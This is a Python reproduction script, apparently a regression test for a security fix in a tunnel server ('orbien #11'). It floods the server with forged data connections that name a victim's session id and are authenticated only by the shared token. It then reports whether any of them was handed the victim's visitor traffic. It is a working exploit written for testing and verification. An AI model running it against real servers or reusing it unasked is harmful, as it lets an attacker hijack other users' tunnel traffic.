#!/usr/bin/env python3
"""Repro 8 for orbien #11: data-connection injection.

Opens many raw data connections naming a victim session id, authenticating
only with the shared token (the pre-fix requirement). Then waits to see
whether any of them receives a StartDataConn when visitor traffic arrives
for the victim's tunnel.

Prints exactly one line: INJECTED (bug present) or NOT-INJECTED (fixed).

Usage: 07-data-conn-inject.py HOST PORT TOKEN VICTIM_SESSION_ID
Requires the server to run with tcpMux=false (plain control streams).
"""
import hashlib
import hmac as hmac_mod
import json
import select
import socket
import struct
import sys
import time

HOST, PORT, TOKEN, SESSION_ID = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
COUNT = 70
DEADLINE = time.time() + 15


def send_msg(sock, type_byte, payload):
    body = json.dumps(payload).encode()
    sock.sendall(bytes([type_byte]) + struct.pack("<I", len(body)) + body)


def digest(timestamp):
    return hmac_mod.new(
        TOKEN.encode(), str(timestamp).encode(), hashlib.sha256
    ).hexdigest()


socks = []
for _ in range(COUNT):
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.setblocking(False)
        ts = int(time.time())
        send_msg(s, ord("W"), {
            "session_id": SESSION_ID,
            "auth_digest": digest(ts),
            "timestamp": ts,
        })
        socks.append(s)
    except OSError:
        pass

# Wait for a StartDataConn ('S') on any forged connection.
bufs = {s: b"" for s in socks}
injected = False
while time.time() < DEADLINE and not injected:
    ready, _, _ = select.select(list(bufs), [], [], 0.5)
    for s in ready:
        try:
            data = s.recv(65536)
        except OSError:
            data = b""
        if not data:
            bufs.pop(s, None)  # server closed it: proof rejected (fixed)
            continue
        bufs[s] += data
        buf = bufs[s]
        while len(buf) >= 5:
            mtype, length = buf[0], struct.unpack("<I", buf[1:5])[0]
            if len(buf) < 5 + length:
                break
            if mtype == ord("S"):
                injected = True
                break
            buf = buf[5 + length:]
        bufs[s] = buf

for s in socks:
    try:
        s.close()
    except OSError:
        pass

print("INJECTED" if injected else "NOT-INJECTED")
